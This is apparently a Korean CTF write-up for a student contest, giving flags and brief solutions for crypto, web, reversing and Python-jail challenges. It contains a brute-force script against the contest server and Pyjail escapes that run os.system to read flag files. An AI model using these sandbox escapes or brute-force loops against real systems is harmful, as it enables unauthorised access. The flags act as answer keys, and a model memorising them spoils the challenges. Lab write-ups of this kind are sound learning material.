페이지에 안들어가져서 못 올린것도 있습니다.
# Hello CTF!(Misc)
![image](https://user-images.githubusercontent.com/36340157/37594496-a21fe116-2bb8-11e8-8bbf-95e8a674d798.png)
FLAG{Welcome_to_DIMIGO_and_STEALTH!!!!!}

# 계산의 달인 (Misc)
![image](https://user-images.githubusercontent.com/36340157/37594651-2b67d91a-2bb9-11e8-9791-cdad640af7bb.png)

    똑같은 숫자를 xor해서 0이 나옵니다.
FLAG{0}

# RGVjcnlwdCB0aGlzIHdvcmQ= (Crypto)
![image](https://user-images.githubusercontent.com/36340157/37594822-b52f6064-2bb9-11e8-92ba-990be0a6ad7f.png)

    base64사이트에 들어가서 decode하면 CHICKEN가 나옵니다.
FLAG{CHICKEN}

# 엥 이게 뭐지?? (Misc)
![image](https://user-images.githubusercontent.com/36340157/37602767-6ff5f456-2bd0-11e8-8977-0d5b2b4b595f.png)

[I_admit.docx](https://github.com/Jae00s/CTF/blob/master/TRUSTEALTH%20CTF/I_admit.docx)

    다운받고 들어가면 하얀색 바탕에 흰색 글씨로 Flag가 써있다
FLAG{Ha_ha!!!_I_am_cute_and_handsome!_Do_you_admit?}

# 보이는게 다가 아니라구! (Misc)
![image](https://user-images.githubusercontent.com/36340157/37602954-d89fe2be-2bd0-11e8-96fa-050d0358fc55.png)

[flag.exe](https://github.com/Jae00s/CTF/blob/master/TRUSTEALTH%20CTF/flag.exe)

    아이다로 열어서 Hex Vivew를 보면 Flag가 존재
FLAG{D0_n0t_judge_4_b00k_by_its_c0ver}

# Do you know what this means? (Crypto)
![image](https://user-images.githubusercontent.com/36340157/37603259-895fc6b4-2bd1-11e8-850a-175faf493da7.png)

    Do_you_know...에 들어가면 WUXVWHDOWK라는 문자열이 있고 시저암호를 이용해서 복호화하면 됩니다.
FLAG{trustealth}

# 관심법 (web)
![image](https://user-images.githubusercontent.com/36340157/37643379-a4a80610-2c63-11e8-9b20-e0cf62a09545.png)

    gwansimbub.html에 들어가서 F12를 눌러서 보면 주석처리 된 것이 있는데 그것이 플래그입니다.

# Show me your ability (web)
![image](https://user-images.githubusercontent.com/36340157/37643655-a1af1182-2c64-11e8-8e46-53f594ec5232.png)

링크에 들어가면 php코드가 나옵니다.(뒤에 나오는 web문제 모두)

![image](https://user-images.githubusercontent.com/36340157/37866119-69dc36be-2fc9-11e8-8d30-6ac0bc9f3711.png)

    주소창에 ?flag=Give me flag 써주면 flag가 나옵니다.
TRUST{you_are_the_greatest_hacker_in_the_world}

# Lucky Number
![image](https://user-images.githubusercontent.com/36340157/37866233-4189da66-2fcb-11e8-9994-1208a2b1fa96.png)

링크에 들어가면 php 코드가 있습니다.

    Try more! 
    <?php

    include(__DIR__."/lib.php");
    // Lucky number is in 0 ~ 9999

    if ($_GET['number'] == $lucky_number)
    {
      echo $flag;
    }

    else 
    {
      echo "Try more! <br>";
    }

    show _source(__FILE__);

    ?>

브루트 포싱해서 알아내었습니다.

    import re
    import urllib
    cont = 0
    for i in range(0, 9999):
      fw=urllib.urlopen("http://dimitrust.oa.to:8080/trustctf/lucky_number/?number=%s"%i)
      read=fw.read()
      flag=re.findall("Try more!", read)
      cont = cont + 1
      if flag:
        print cont
      else:
        print "number is : %d"%i
        break
![luck](https://user-images.githubusercontent.com/36340157/37866269-d3d1dcf2-2fcb-11e8-8dcf-7e4bf14d747c.PNG)
# Do you know php trick?
    no hack <?php

    include(__DIR__."/lib.php");
    extract($_GET);

    if ($_SESSION['var'] === $_COOKIE['var'])
    {
      echo "no hack";
    }

    else if ( md5($_SESSION['var']) == md5($_COOKIE['var']) )
    {
      echo $flag;
    }

    show_source(__FILE__);
    ?>
매직해쉬 php취약점을 이용해서 해결
![do you know php trick](https://user-images.githubusercontent.com/36340157/37866354-e9ed05f6-2fcc-11e8-819a-b63171313904.PNG)
TRUST{you_are_php_trick_master}

# dcinside
![image](https://user-images.githubusercontent.com/36340157/37866370-50f3c762-2fcd-11e8-8df2-e81db8ad858f.png)

[dcinside.pcapng](https://github.com/Jae00s/CTF/blob/master/TRUSTEALTH%20CTF/dcinside.pcapng)

    wireshark를 이용해서 열어서 flag를 검색하면 dcinside가 나오고 링크가 하나 있는데 누르면
    flag가 나옵니다.
    
![image](https://user-images.githubusercontent.com/36340157/37866431-05bc48e0-2fce-11e8-9ac3-f9367953a825.png)
flag{You_know_tcp_protocol}

# Can you Connect lt...?
![image](https://user-images.githubusercontent.com/36340157/37866456-453fdcd4-2fce-11e8-96e9-571bee81d017.png)

    nc 연결하면 flag가 나옵니다.
![pwn1](https://user-images.githubusercontent.com/36340157/37866469-6eb28184-2fce-11e8-8962-31f0effe7060.PNG)

# Overflow It!
![image](https://user-images.githubusercontent.com/36340157/37866478-8c0403b6-2fce-11e8-80ce-0a4fb5c817e7.png)

[소스](https://gist.github.com/chaneyoon/39cb2dd54169b30a9f1aa29adedbc7d9)
    
![overflowit](https://user-images.githubusercontent.com/36340157/37866502-c4b961ba-2fce-11e8-90e9-554efa577ae5.PNG)

# Python Shell
![image](https://user-images.githubusercontent.com/36340157/37866521-04514b62-2fcf-11e8-9436-d37f24eba47c.png)

    연결하고 아무거나 눌러보면 input()을 받고 있다는 것을 알수 있습니다.
![python_jail](https://user-images.githubusercontent.com/36340157/37866529-158d6cda-2fcf-11e8-82e8-6f9150e99bfe.PNG)

# Pyjail
![image](https://user-images.githubusercontent.com/36340157/37866546-68ac9d0a-2fcf-11e8-9c07-62d11ce91f64.png)

     print(dir())
    ['ban_list', 'data', 'j']
     del(ban_list[0:])
     __import__('os').system("cat /home/Pyjail/flag"
벤 리스트를 지우고 공격하면 됩니다.
TRUST{pyjail_1s_s0_h4rd_:(}
  
# Pyjail2
![image](https://user-images.githubusercontent.com/36340157/37866586-0b78b2f8-2fd0-11e8-8440-4af6430718de.png)

    print(dir())
    ['b4n1ist15it', 'data', 'j']
     b4n1ist15it=()
     __import__('os').system("cat /home/Pyjail2/flag")
벤을 지우고 공격입니다.
TRUST{dir_mag1c_N3w_meta_pyja1l_1s_g00d_0r_b4d...?_t3l1_m3}

# What is reversing? 
![image](https://user-images.githubusercontent.com/36340157/37866686-6e9741aa-2fd1-11e8-838a-d02959e3a541.png)

[whatisrev.exe](https://github.com/Jae00s/CTF/blob/master/TRUSTEALTH%20CTF/whatisrev.exe)

![image](https://user-images.githubusercontent.com/36340157/37866663-338af606-2fd1-11e8-8af3-3c55c1066105.png)

    올리디버거로 열어보면 있습니다.

# Linux_Rev
![image](https://user-images.githubusercontent.com/36340157/37866734-f88e135c-2fd1-11e8-8e72-6cd986c2e0f5.png)

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int result; // eax@4
      __int64 v4; // rcx@4
      int v5; // [sp+0h] [bp-10h]@1
      int v6; // [sp+4h] [bp-Ch]@1
      __int64 v7; // [sp+8h] [bp-8h]@1

      v7 = *MK_FP(__FS__, 40LL);
      v6 = 10;
      printf("input : ", argv, envp);
      __isoc99_scanf((__int64)"%d", (__int64)&v5);
      v6 = 12 * (v6 - 3) + 1;
      printf("%d\n", (unsigned int)v6);
      if ( v6 == v5 )
        flag();
      else
        puts("Wrong");
      result = 0;
      v4 = *MK_FP(__FS__, 40LL) ^ v7;
      return result;
    }
    85를 입력받으면 flag()를 실행시키므로 85입력
![linux_rev](https://user-images.githubusercontent.com/36340157/37866779-98453240-2fd2-11e8-82c1-cb9d91846d4e.PNG) 


